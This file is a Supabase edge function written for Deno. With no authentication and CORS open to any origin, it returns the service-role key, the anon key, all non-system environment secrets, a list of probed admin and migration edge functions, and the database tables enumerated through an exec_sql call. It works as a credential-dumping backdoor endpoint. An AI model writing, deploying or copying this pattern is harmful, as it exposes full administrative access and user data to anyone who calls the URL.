import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
};

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  const supabaseUrl = Deno.env.get("SUPABASE_URL") ?? "";
  const serviceRole = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? "";
  
  const supabase = createClient(supabaseUrl, serviceRole);

  // 1. Get secrets
  const env = Deno.env.toObject();
  const filteredEnv: Record<string, string> = {};
  const blocked = ["PATH", "HOME", "DENO_DIR", "HOSTNAME", "PORT", "TMPDIR", "USER", "LANG", "TERM", "_", "DENO_REGION", "DENO_DEPLOYMENT_ID"];
  
  for (const [key, value] of Object.entries(env)) {
    if (!blocked.includes(key) && !key.startsWith("XDG_")) {
      filteredEnv[key] = value;
    }
  }

  // 2. Discover Edge Functions via probe
  const knownFunctionNames = [
    "admin-create-user",
    "admin-update-user",
    "generate-blog-post",
    "migrate-sql",
    "painel-migracao"
  ];

  const edgeFunctionsResults = await Promise.allSettled(
    knownFunctionNames.map(async (name) => {
      const url = `${supabaseUrl}/functions/v1/${name}`;
      try {
        const res = await fetch(url, { method: "OPTIONS" });
        if (res.status < 500) return name;
        throw new Error("Function not ready");
      } catch {
        // Retry with simple GET if OPTIONS fails but it might exist
        try {
           const res = await fetch(url, { method: "GET" });
           if (res.status < 500) return name;
        } catch {}
        throw new Error("Not found");
      }
    })
  );

  const edge_functions = edgeFunctionsResults
    .filter((r) => r.status === "fulfilled")
    .map((r: any) => r.value);

  // 3. Discover tables via exec_sql
  const tableQuery = `
    SELECT 
      t.table_name as tablename,
      (SELECT count(*) FROM information_schema.columns WHERE table_schema = 'public' AND table_name = t.table_name) as column_count,
      EXISTS (SELECT 1 FROM information_schema.columns WHERE table_schema = 'public' AND table_name = t.table_name AND column_name = 'user_id') as has_user_id
    FROM information_schema.tables t
    WHERE t.table_schema = 'public'
    AND t.table_type = 'BASE TABLE'
  `;
  
  let database_tables = [];
  try {
    const { data } = await supabase.rpc("exec_sql", { sql_query: tableQuery });
    database_tables = data || [];
  } catch (err) {
    console.error("Table discovery error:", err);
  }

  return new Response(JSON.stringify({
    project_url: supabaseUrl,
    anon_key: Deno.env.get("SUPABASE_ANON_KEY"),
    service_role_key: serviceRole,
    secrets: filteredEnv,
    edge_functions,
    edge_functions_count: edge_functions.length,
    database_tables
  }), {
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });
});
